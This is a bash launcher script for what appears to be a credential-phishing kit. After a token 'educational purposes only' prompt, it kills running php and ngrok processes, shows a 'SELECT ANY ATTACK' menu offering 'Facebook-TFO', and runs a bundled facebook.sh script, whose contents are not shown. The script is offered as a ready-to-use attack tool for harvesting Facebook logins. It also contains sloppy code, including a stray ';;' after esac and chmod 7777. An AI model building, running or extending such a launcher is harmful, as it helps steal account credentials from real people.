#!/bin/bash
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32mT H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear

clear
chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY ATTACK \e[0m'
echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
echo ""


printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Facebook-TFO\e[0m \e[0m\n" 



echo "" 
echo ""

read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in 
			 

	 
	 1)cd sites/
cd facebook/
chmod 7777 facebook.sh 
./facebook.sh 



;;




99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m >> THANKS FOR JOIN US >> \e[0m'
sleep 1
exit
;;


esac
;;
